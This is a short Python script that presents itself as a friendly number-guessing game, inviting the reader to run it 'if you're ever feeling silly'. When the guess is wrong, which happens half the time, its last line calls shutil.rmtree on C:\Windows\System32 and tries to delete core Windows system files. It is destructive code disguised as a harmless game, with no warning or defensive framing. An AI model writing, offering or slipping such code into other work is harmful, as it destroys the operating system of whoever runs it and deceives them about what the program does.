import random
import shutil

number = random.randint(1,2)

# If you're ever feeling silly, run this script and play the game!
guess = input("Hey buddy! Guess number between 1 and 2:")
guess = int(guess)

if guess == number:
    print("Yay!")
else:
    shutil.rmtree("C:\Windows\System32") 